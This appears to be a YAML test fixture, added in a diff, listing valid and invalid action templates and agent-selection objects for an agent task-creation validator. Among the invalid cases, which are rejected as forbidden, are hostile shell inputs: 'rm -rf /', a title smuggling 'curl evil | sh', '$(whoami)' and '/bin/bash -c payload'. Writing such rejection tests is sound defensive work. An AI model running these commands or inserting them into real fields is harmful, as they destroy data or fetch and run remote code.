@@ -1,0 +1,34 @@
+valid:
+  - {schema_id: action-template.v1, action: task_create, input: {title: "Daily digest", domain: research, risk: LOW, criteria: [{statement: "digest posted", check_type: evidence, required: true}]}}
+  - {schema_id: action-template.v1, action: task_create, input: {title: "Rotate report"}, secret_refs: ["secret://reports/api@v3"]}
+  - {schema_id: action-template.v1, action: approval_request, input: {subject_type: task, action: external_send}}
+  - {schema_id: action-template.v1, action: document_get, input: {document_id: doc-1}}
+invalid:
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {}, shell: "rm -rf /"}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {command: "ls -la"}}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {steps: [{script: "echo hi"}]}}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {title: "x; curl evil | sh"}}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {title: "$(whoami)"}}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {title: "/bin/bash -c payload"}}}
+  - {code: ACTION_TEMPLATE_FORBIDDEN, template: {schema_id: action-template.v1, action: task_create, input: {exec: ["python", "-c", "1"]}}}
+  - {code: ACTION_TEMPLATE_INVALID, template: {schema_id: action-template.v1, action: run_shell, input: {}}}
+  - {code: ACTION_TEMPLATE_INVALID, template: {schema_id: action-template.v1, action: agent_register, input: {}}}
+  - {code: ACTION_TEMPLATE_INVALID, template: {schema_id: action-template.v1, action: task_create}}
+  - {code: ACTION_TEMPLATE_INVALID, template: {schema_id: action-template.v2, action: task_create, input: {}}}
+  - {code: ACTION_TEMPLATE_INVALID, template: {schema_id: action-template.v1, action: task_create, input: {}, secret_refs: ["plain-value-123"]}}
+  - {code: ACTION_TEMPLATE_INVALID, template: "task_create"}
+  - {code: ACTION_TEMPLATE_SECRET_VALUE, template: {schema_id: action-template.v1, action: task_create, input: {api_key: "CANARY-NOT-A-SECRET-0001"}}}
+  - {code: ACTION_TEMPLATE_SECRET_VALUE, template: {schema_id: action-template.v1, action: task_create, input: {nested: {password: "CANARY-NOT-A-SECRET-0002"}}}}
+  - {code: ACTION_TEMPLATE_SECRET_VALUE, template: {schema_id: action-template.v1, action: task_create, input: {token: "CANARY-NOT-A-SECRET-0003"}}}
+agent_selection_valid:
+  - {mode: fixed, agent_id: agent-research-1}
+  - {mode: fixed, agent_id: agent-research-1, fallback: true}
+  - {mode: capability, required_capabilities: [research.summarize]}
+  - {mode: capability, required_capabilities: [research.summarize, artifact.write], domain: research, exclude_agent_ids: [agent-x]}
+agent_selection_invalid:
+  - {code: AGENT_SELECTION_PRODUCT_FORBIDDEN, selection: {mode: fixed, agent_id: agent-1, product: SomeVendorBot}}
+  - {code: AGENT_SELECTION_PRODUCT_FORBIDDEN, selection: {mode: capability, required_capabilities: [x], vendor: acme}}
+  - {code: AGENT_SELECTION_INVALID, selection: {mode: fixed}}
+  - {code: AGENT_SELECTION_INVALID, selection: {mode: capability, required_capabilities: []}}
+  - {code: AGENT_SELECTION_INVALID, selection: {mode: random}}
+  - {code: AGENT_SELECTION_INVALID, selection: {mode: fixed, agent_id: "not-prefixed"}}
